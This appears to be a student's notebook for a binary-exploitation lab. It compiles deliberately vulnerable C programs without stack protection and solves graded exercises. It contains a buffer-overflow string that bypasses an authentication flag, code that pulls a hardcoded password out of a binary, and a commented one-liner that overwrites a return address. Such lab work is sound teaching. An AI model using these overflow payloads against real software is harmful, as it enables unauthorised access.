# %%
import subprocess
import struct
import sys
from typing import Optional, Tuple


def exec_sh(command: str, timeout: Optional[int] = 30, check_retcode: bool = True) -> subprocess.CompletedProcess:
    """Execute a shell command and return the result."""
    return subprocess.run(command, shell=True, capture_output=True, text=True, check=False, timeout=timeout)


def compile_vulnerable_binary(source_file: str, output_file: str, extra_flags: str = "") -> bool:
    """Compile a C program with security features disabled for educational purposes."""
    flags = "-fno-stack-protector -z execstack -no-pie -g"
    cmd = f"gcc {flags} {extra_flags} -o {output_file} {source_file}"
    result = exec_sh(cmd)
    return result.returncode == 0


def hex_dump(data: bytes, start_address: int = 0) -> str:
    """Create a hex dump of binary data."""
    lines = []
    for i in range(0, len(data), 16):
        hex_part = " ".join(f"{b:02x}" for b in data[i : i + 16])
        ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in data[i : i + 16])
        lines.append(f"{start_address + i:08x}: {hex_part:<48} |{ascii_part}|")
    return "\n".join(lines)


# %%
def exploit_basic_overflow() -> str:
    """
    Create an exploit string that overflows the password buffer
    and overwrites the 'authorized' variable to bypass authentication.

    Hint: The password buffer is 16 bytes, and 'authorized' is right after it.
    What happens if we write more than 16 bytes?

    Returns:
        The exploit string that will grant access
    """
    # TODO: Create an exploit string that:
    #   1. Fills the 16-byte password buffer
    #   2. Overwrites the 'authorized' variable with a non-zero value
    #   3. Remember to add a newline at the end
    return (b"\x78" * 16 + b"\x01" * 5).decode()


from w2d1_re_test import test_basic_overflow


test_basic_overflow(exploit_basic_overflow)
# %%
with open("first", "rb") as f:
    x = f.read()
# re.match('secret', x)
# %%


def find_password_in_binary() -> str:
    """
    Find the hardcoded password in the first.c binary.

    Hint: Try running: strings first | grep -E '^[a-z0-9]{6,}$'
    Or look for the strcmp() call in the decompiled code.

    Returns:
        The password found in the binary
    """
    import re
    import string

    # 1. Define the minimum length for a string to be considered valid.
    min_len = 4

    # 2. Create a regular expression pattern.
    #    - string.printable contains all printable ASCII characters (letters, numbers, punctuation, whitespace).
    #    - re.escape() handles any special regex characters within that set.
    #    - f'[{...}]{{{min_len},}}' looks for sequences of at least `min_len` printable characters.
    #    - .encode('ascii') turns the pattern into bytes, so it can search your bytes object.
    pattern = f"[{re.escape(string.printable)}]{{{min_len},}}".encode("ascii")

    # 3. Find all matching byte strings.
    found_byte_strings = re.findall(pattern, x)

    # 4. Decode the results from bytes into regular Python strings.
    result = [s.decode("ascii") for s in found_byte_strings]

    # Now 'result' holds your list of strings!
    for r in result:
        if r.startswith("secret"):
            return r
    return None


from w2d1_re_test import test_password_extraction


test_password_extraction(find_password_in_binary)

#%%
# ./second "$(python -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\x00\x40\x06\x74\n')")"  
